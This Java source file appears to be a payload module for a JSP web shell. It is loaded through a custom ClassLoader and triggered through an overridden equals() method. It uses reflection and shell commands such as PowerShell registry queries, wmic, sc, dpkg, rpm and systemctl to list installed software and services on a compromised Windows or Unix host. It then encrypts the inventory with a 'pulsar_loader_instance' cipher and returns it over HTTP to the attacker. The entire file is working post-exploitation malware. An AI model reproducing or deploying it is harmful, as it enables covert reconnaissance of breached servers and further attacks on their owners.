import java.io.*;
import java.lang.reflect.Method;
import java.util.*;
import java.util.regex.*;
import java.nio.charset.StandardCharsets;

public class app_serv extends ClassLoader {

    public app_serv(ClassLoader objParent) { super(objParent); }
    public app_serv() { super(app_serv.class.getClassLoader()); }

    private boolean isWindows() {
        String os = System.getProperty("os.name").toLowerCase();
        return os.contains("win");
    }

    private boolean hasPowerShell() {
        try {
            Process p = new ProcessBuilder("powershell", "-Command", "Get-Host").start();
            return p.waitFor() == 0;
        } catch (Exception e) {
            return false;
        }
    }

    private boolean commandExists(String cmd) {
        try {
            String checkCmd = isWindows() ? "where " + cmd : "which " + cmd;
            Process p = new ProcessBuilder(isWindows() ? "cmd.exe" : "/bin/sh", isWindows() ? "/c" : "-c", checkCmd).start();
            return p.waitFor() == 0;
        } catch (Exception e) {
            return false;
        }
    }

    private String runPowerShell(String query) {
        try {
            String cmd = "[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; " +
                         "$OutputEncoding = [System.Text.Encoding]::UTF8; " +
                         query + " | ConvertTo-Json -Depth 3 -Compress";
            
            ProcessBuilder pb = new ProcessBuilder("powershell", "-NoProfile", "-Command", cmd);
            pb.redirectErrorStream(true);
            Process p = pb.start();

            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream(), StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                sb.append(line);
            }
            p.waitFor();

            String result = sb.toString().trim();
            if (result.isEmpty()) return "[]";
            if (result.startsWith("{") && result.endsWith("}")) return "[" + result + "]";
            return result;
        } catch (Exception e) {
            return "[]";
        }
    }

    private List<String> runNativeCommand(String... cmdTokens) {
        List<String> output = new ArrayList<String>();
        try {
            ProcessBuilder pb = new ProcessBuilder(cmdTokens);
            pb.redirectErrorStream(true);
            Process p = pb.start();

            String charsetName = isWindows() ? System.getProperty("sun.jnu.encoding", "Big5") : "UTF-8";
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream(), charsetName));
            String line;
            while ((line = reader.readLine()) != null) {
                output.add(line);
            }
            p.waitFor();
        } catch (Exception e) {
            // ignore
        }
        return output;
    }

    private String getWindowsApplications(boolean canUsePS) {
        if (canUsePS) {
            String psQuery = "Get-ChildItem 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall', 'HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall' -ErrorAction SilentlyContinue " +
                             "| ForEach-Object { try { Get-ItemProperty $_.PSPath -ErrorAction Stop } catch {} } " +
                             "| Where-Object {$_.DisplayName} " +
                             "| Select-Object @{N='name';E={$_.DisplayName}}, @{N='version';E={$_.DisplayVersion}}, @{N='vendor';E={$_.Publisher}}, @{N='installed';E={$_.InstallDate}}, @{N='source';E={'powershell_registry'}}";
            String psRes = runPowerShell(psQuery);
            if (!psRes.equals("[]") && !psRes.isEmpty()) return psRes;
        }

        if (commandExists("wmic")) {
            List<String> lines = runNativeCommand("cmd.exe", "/c", "wmic product get Name,Version,Vendor,InstallDate /format:csv 2>NUL");
            StringBuilder json = new StringBuilder("[");
            boolean first = true;
            for (String line : lines) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("Node,")) continue;
                String[] cols = line.split(",");
                if (cols.length >= 5) {
                    String name = cols[2].trim();
                    if (!name.isEmpty()) {
                        if (!first) json.append(",");
                        json.append("{\"name\":\"").append(escapeJson(name)).append("\",")
                            .append("\"version\":\"").append(escapeJson(cols.length > 4 ? cols[4].trim() : "")).append("\",")
                            .append("\"vendor\":\"").append(escapeJson(cols.length > 3 ? cols[3].trim() : "")).append("\",")
                            .append("\"installed\":\"").append(escapeJson(cols.length > 1 ? cols[1].trim() : "")).append("\",")
                            .append("\"source\":\"wmic\"}");
                        first = false;
                    }
                }
            }
            json.append("]");
            return json.toString();
        }
        return "[]";
    }

    private String getWindowsServices(boolean canUsePS) {
        if (canUsePS) {
            String psQuery = "Get-Service | ForEach-Object { [PSCustomObject]@{ name = $_.Name; display_name = $_.DisplayName; status = if($_.Status -eq 'Running'){'running'}else{'stopped'}; start_type = $_.StartType.ToString(); source = 'powershell' } }";
            String psRes = runPowerShell(psQuery);
            if (!psRes.equals("[]") && !psRes.isEmpty()) return psRes;
        }

        if (commandExists("wmic")) {
            List<String> lines = runNativeCommand("cmd.exe", "/c", "wmic service get Name,DisplayName,State,StartMode /format:csv 2>NUL");
            StringBuilder json = new StringBuilder("[");
            boolean first = true;
            for (String line : lines) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("Node,")) continue;
                String[] cols = line.split(",");
                if (cols.length >= 5) {
                    String name = cols[2].trim();
                    if (!name.isEmpty()) {
                        if (!first) json.append(",");
                        String status = cols[4].trim().toLowerCase().equals("running") ? "running" : "stopped";
                        json.append("{\"name\":\"").append(escapeJson(name)).append("\",")
                            .append("\"display_name\":\"").append(escapeJson(cols[1].trim())).append("\",")
                            .append("\"status\":\"").append(status).append("\",")
                            .append("\"start_type\":\"").append(escapeJson(cols[3].trim())).append("\",")
                            .append("\"source\":\"wmic\"}");
                        first = false;
                    }
                }
            }
            json.append("]");
            if (lines.size() > 1) return json.toString();
        }

        if (commandExists("sc")) {
            List<String> lines = runNativeCommand("cmd.exe", "/c", "sc query state= all type= service 2>NUL");
            StringBuilder json = new StringBuilder("[");
            boolean first = true;
            String currName = "", currDisp = "", currStat = "stopped";

            for (String line : lines) {
                line = line.trim();
                if (line.startsWith("SERVICE_NAME:")) {
                    if (!currName.isEmpty()) {
                        if (!first) json.append(",");
                        json.append(buildServiceJson(currName, currDisp, currStat, "unknown", "sc"));
                        first = false;
                    }
                    currName = line.substring(13).trim(); currDisp = ""; currStat = "stopped";
                } else if (line.startsWith("DISPLAY_NAME:")) {
                    currDisp = line.substring(13).trim();
                } else if (line.startsWith("STATE") && line.toUpperCase().contains("RUNNING")) {
                    currStat = "running";
                }
            }
            if (!currName.isEmpty()) {
                if (!first) json.append(",");
                json.append(buildServiceJson(currName, currDisp, currStat, "unknown", "sc"));
            }
            json.append("]");
            return json.toString();
        }
        return "[]";
    }

    private String getUnixLikeApplications() {
        StringBuilder json = new StringBuilder("[");
        boolean first = true;

        if (commandExists("dpkg-query")) {
            List<String> lines = runNativeCommand("/bin/sh", "-c", "dpkg-query -W -f='${Package}\t${Version}\t${Maintainer}\n' 2>/dev/null");
            for (String line : lines) {
                String[] parts = line.trim().split("\t");
                if (parts.length >= 2) {
                    if (!first) json.append(",");
                    json.append(buildAppJson(parts[0], parts[1], parts.length > 2 ? parts[2] : "", "", "dpkg"));
                    first = false;
                }
            }
        } else if (commandExists("rpm")) {
            List<String> lines = runNativeCommand("/bin/sh", "-c", "rpm -qa --qf '%{NAME}\t%{VERSION}-%{RELEASE}\t%{VENDOR}\n' 2>/dev/null");
            for (String line : lines) {
                String[] parts = line.trim().split("\t");
                if (parts.length >= 2) {
                    if (!first) json.append(",");
                    json.append(buildAppJson(parts[0], parts[1], parts.length > 2 ? parts[2] : "", "", "rpm"));
                    first = false;
                }
            }
        }

        if (commandExists("brew")) {
            List<String> lines = runNativeCommand("/bin/sh", "-c", "brew list --versions 2>/dev/null");
            for (String line : lines) {
                String[] parts = line.trim().split(" ");
                if (parts.length >= 2) {
                    if (!first) json.append(",");
                    json.append(buildAppJson(parts[0], parts[1], "Homebrew", "", "homebrew"));
                    first = false;
                }
            }
        }

        if (commandExists("snap")) {
            List<String> lines = runNativeCommand("/bin/sh", "-c", "snap list 2>/dev/null");
            if (lines.size() > 1) lines.remove(0);
            for (String line : lines) {
                String[] cols = line.trim().split("\\s+");
                if (cols.length >= 2) {
                    if (!first) json.append(",");
                    json.append(buildAppJson(cols[0], cols[1], cols.length > 4 ? cols[4] : "", "", "snap"));
                    first = false;
                }
            }
        }

        json.append("]");
        return json.toString();
    }

    private String getUnixLikeServices() {
        StringBuilder json = new StringBuilder("[");
        boolean first = true;

        if (commandExists("systemctl")) {
            List<String> lines = runNativeCommand("/bin/sh", "-c", "systemctl list-units --type=service --all --no-pager --no-legend 2>/dev/null");
            for (String line : lines) {
                String[] cols = line.trim().split("\\s+", 5);
                if (cols.length >= 4) {
                    if (!first) json.append(",");
                    String name = cols[0].replace(".service", "");
                    String disp = cols.length > 4 ? cols[4] : cols[0];
                    String status = cols[2].equals("active") ? "running" : "stopped";
                    json.append(buildServiceJson(name, disp, status, "", "systemd"));
                    first = false;
                }
            }
        } else if (commandExists("service")) {
            List<String> lines = runNativeCommand("/bin/sh", "-c", "service --status-all 2>/dev/null");
            Pattern p = Pattern.compile("\\[\\s*([+\\-\\?])\\s*\\]\\s+(.+)");
            for (String line : lines) {
                Matcher m = p.matcher(line.trim());
                if (m.matches()) {
                    if (!first) json.append(",");
                    String status = m.group(1).equals("+") ? "running" : "stopped";
                    String name = m.group(2).trim();
                    json.append(buildServiceJson(name, name, status, "", "sysvinit"));
                    first = false;
                }
            }
        } else if (commandExists("launchctl")) {
            List<String> lines = runNativeCommand("/bin/sh", "-c", "launchctl list 2>/dev/null");
            if (lines.size() > 1) lines.remove(0);
            for (String line : lines) {
                String[] cols = line.trim().split("\\s+", 3);
                if (cols.length >= 3) {
                    if (!first) json.append(",");
                    String pid = cols[0];
                    String label = cols[2];
                    boolean isRunning = !pid.equals("-") && pid.matches("\\d+");
                    json.append(buildServiceJson(label, label, isRunning ? "running" : "stopped", "", "launchd"));
                    first = false;
                }
            }
        }

        json.append("]");
        return json.toString();
    }

    private String buildAppJson(String name, String ver, String vendor, String inst, String src) {
        return "{\"name\":\"" + escapeJson(name) + "\","
             + "\"version\":\"" + escapeJson(ver) + "\","
             + "\"vendor\":\"" + escapeJson(vendor) + "\","
             + "\"installed\":\"" + escapeJson(inst) + "\","
             + "\"source\":\"" + src + "\"}";
    }

    private String buildServiceJson(String name, String disp, String stat, String type, String src) {
        return "{\"name\":\"" + escapeJson(name) + "\","
             + "\"display_name\":\"" + escapeJson(disp.isEmpty() ? name : disp) + "\","
             + "\"status\":\"" + stat + "\","
             + "\"start_type\":\"" + escapeJson(type) + "\","
             + "\"source\":\"" + src + "\"}";
    }

    private String escapeJson(String input) {
        if (input == null) return "";
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < input.length(); i++) {
            char ch = input.charAt(i);
            switch (ch) {
                case '\\': sb.append("\\\\"); break;
                case '"':  sb.append("\\\""); break;
                case '\b': sb.append("\\b");  break;
                case '\f': sb.append("\\f");  break;
                case '\n': sb.append("\\n");  break;
                case '\r': sb.append("\\r");  break;
                case '\t': sb.append("\\t");  break;
                case '/':  sb.append("\\/");  break;
                default:
                    if (ch >= 0 && ch <= 0x1F) {
                        String ss = Integer.toHexString(ch);
                        sb.append("\\u");
                        for (int k = 0; k < 4 - ss.length(); k++) sb.append('0');
                        sb.append(ss.toUpperCase());
                    } else {
                        sb.append(ch);
                    }
            }
        }
        return sb.toString();
    }

    private String collectSystemData() {
        boolean isWin = isWindows();
        StringBuilder json = new StringBuilder();
        json.append("{\n");
        json.append("  \"success\": true,\n");
        json.append("  \"system_type\": \"" + (isWin ? "windows" : "unix_like") + "\",\n");
        json.append("  \"os_raw\": \"" + escapeJson(System.getProperty("os.name") + " (" + System.getProperty("os.version") + ")") + "\",\n");
        json.append("  \"error\": \"\",\n");
        json.append("  \"data\": {\n");
        
        if (isWin) {
            boolean canUsePS = hasPowerShell();
            json.append("    \"applications\": ").append(getWindowsApplications(canUsePS)).append(",\n");
            json.append("    \"services\": ").append(getWindowsServices(canUsePS)).append("\n");
        } else {
            json.append("    \"applications\": ").append(getUnixLikeApplications()).append(",\n");
            json.append("    \"services\": ").append(getUnixLikeServices()).append("\n");
        }
        
        json.append("  }\n");
        json.append("}");
        return json.toString();
    }

    private void fnWriteOutput(Object objParam, Object objResponse, OutputStream osClient, byte[] abResult) {
        if (abResult.length == 0)
            abResult = "DARKMATTER_SUCCESS: Action executed but returned no output".getBytes();
        Object objPageContext = objParam;
        try {
            byte[] abEncryptedResult = Encrypt(objParam, abResult);
            osClient.write(abEncryptedResult);
            osClient.flush();

            Method fnSetStatus = objResponse.getClass().getMethod("setStatus", new Class[]{int.class});
            fnSetStatus.invoke(objResponse, new Object[]{200});

            try {
                Method fnGetOut = objPageContext.getClass().getMethod("getOut", new Class[0]);
                Object objOut = fnGetOut.invoke(objPageContext, new Object[0]);
                Method fnClear = objOut.getClass().getMethod("clear", new Class[0]);
                fnClear.invoke(objOut, new Object[0]);
            } catch (Exception exIgnored) {}

            Method fnFlushBuffer = objResponse.getClass().getMethod("flushBuffer", new Class[0]);
            fnFlushBuffer.invoke(objResponse, new Object[0]);
        } catch (Exception exIgnored) {}
    }

    private byte[] Encrypt(Object objPageContext, byte[] abRawResponse) {
        try {
            if (objPageContext == null) return abRawResponse;
            Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
            Object objRequest = fnGetRequest.invoke(objPageContext, new Object[0]);
            Method fnGetAttribute = objRequest.getClass().getMethod("getAttribute", new Class[]{String.class});
            Object objPulsarLoader = fnGetAttribute.invoke(objRequest, new Object[]{"pulsar_loader_instance"});
            if (objPulsarLoader == null) return abRawResponse;
            Method fnCrypt = objPulsarLoader.getClass().getDeclaredMethod("Crypt", byte[].class, int.class);
            fnCrypt.setAccessible(true);
            return (byte[])fnCrypt.invoke(objPulsarLoader, abRawResponse, 1);
        } catch (Exception exCrashed) {
            return abRawResponse;
        }
    }

    @Override
    public boolean equals(Object objParam) {
        Object objPageContext = objParam;
        Object objResponse = null;
        try {
            Method fnGetResponse = objPageContext.getClass().getMethod("getResponse", new Class[0]);
            objResponse = fnGetResponse.invoke(objPageContext, new Object[0]);
            Method fnGetOutputStream = objResponse.getClass().getMethod("getOutputStream", new Class[0]);
            OutputStream osClient = (OutputStream) fnGetOutputStream.invoke(objResponse, new Object[0]);
            
            String currentData = collectSystemData();
            byte[] abResult = currentData.getBytes(StandardCharsets.UTF_8);
            
            fnWriteOutput(objPageContext, objResponse, osClient, abResult);
        } catch (Exception exIgnored) {}
        return true;
    }
}
